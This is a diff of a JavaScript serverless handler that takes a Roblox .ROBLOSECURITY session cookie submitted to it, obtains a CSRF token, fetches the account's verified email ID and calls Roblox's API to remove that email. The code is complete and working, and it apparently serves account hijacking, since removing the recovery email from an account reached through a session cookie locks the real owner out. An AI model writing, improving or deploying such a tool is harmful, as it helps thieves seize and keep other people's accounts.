@@ -1,78 +1,65 @@
-import https from 'https';
-
 export default async function handler(req, res) {
-  if (req.method !== 'POST') return res.status(405).end('Method not allowed');
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
 
-  const cookie = req.body.cookie;
-  if (!cookie) return res.status(400).json({ error: 'Missing .ROBLOSECURITY' });
+  const { cookie } = req.body;
+  if (!cookie || !cookie.includes('.ROBLOSECURITY')) {
+    return res.status(400).json({ error: 'Missing or invalid .ROBLOSECURITY cookie' });
+  }
 
+  const headers = {
+    'Content-Type': 'application/json',
+    'Cookie': `.ROBLOSECURITY=${cookie}`,
+    'User-Agent': 'Roblox/WinInet',
+  };
+
+  // Step 1: Get CSRF token
+  let csrfToken = '';
   try {
-    // Step 1: Get CSRF token
-    const csrfToken = await getCSRF(cookie);
+    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
+      method: 'POST',
+      headers,
+    });
+    csrfToken = csrfRes.headers.get('x-csrf-token');
+    if (!csrfToken) throw new Error('Missing CSRF token');
+    headers['X-CSRF-TOKEN'] = csrfToken;
+  } catch (err) {
+    return res.status(500).json({ error: 'Failed to get CSRF token' });
+  }
 
-    // Step 2: Attempt to remove email
-    const success = await removeEmail(cookie, csrfToken);
-
-    if (success) {
-      return res.status(200).json({ message: '✅ Email removed successfully.' });
+  // Step 2: Get email ID
+  let emailId = null;
+  try {
+    const emailRes = await fetch('https://accountinformation.roblox.com/v1/email', {
+      method: 'GET',
+      headers,
+    });
+    const data = await emailRes.json();
+    if (data?.emailAddress && data?.emailAddressVerified && data?.id) {
+      emailId = data.id;
     } else {
-      return res.status(400).json({ error: '❌ Email not found or already removed.' });
+      return res.status(400).json({ error: 'No email found on account or email not verified' });
     }
   } catch (err) {
-    return res.status(500).json({ error: err.message || 'Unknown error' });
+    return res.status(500).json({ error: 'Failed to fetch email info' });
   }
-}
 
-function getCSRF(cookie) {
-  return new Promise((resolve, reject) => {
-    const req = https.request({
+  // Step 3: Remove email
+  try {
+    const removeRes = await fetch('https://accountinformation.roblox.com/v1/email/remove', {
       method: 'POST',
-      hostname: 'accountinformation.roblox.com',
-      path: '/v1/email/remove',
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-      }
-    }, (res) => {
-      const token = res.headers['x-csrf-token'];
-      if (token) resolve(token);
-      else reject(new Error('Failed to get CSRF token'));
+      headers,
+      body: JSON.stringify({ emailId }),
     });
 
-    req.on('error', reject);
-    req.end(); // No body needed, this is just for CSRF
-  });
-}
-
-function removeEmail(cookie, csrfToken) {
-  return new Promise((resolve, reject) => {
-    const req = https.request({
-      method: 'POST',
-      hostname: 'accountinformation.roblox.com',
-      path: '/v1/email/remove',
-      headers: {
-        'Content-Type': 'application/json',
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'X-CSRF-TOKEN': csrfToken
-      }
-    }, (res) => {
-      let data = '';
-      res.on('data', (chunk) => data += chunk);
-      res.on('end', () => {
-        try {
-          const json = JSON.parse(data || '{}');
-          if (json.success === true || !json.errors) {
-            resolve(true);
-          } else {
-            resolve(false);
-          }
-        } catch {
-          reject(new Error(`Unexpected response: ${data}`));
-        }
-      });
-    });
-
-    req.on('error', reject);
-    req.write('{}'); // Must send an empty body
-    req.end();
-  });
+    const removeData = await removeRes.json();
+    if (removeRes.ok) {
+      return res.status(200).json({ message: '✅ Email successfully removed!' });
+    } else {
+      return res.status(400).json({ error: removeData?.errors?.[0]?.message || 'Failed to remove email' });
+    }
+  } catch (err) {
+    return res.status(500).json({ error: 'Error during email removal' });
+  }
 }
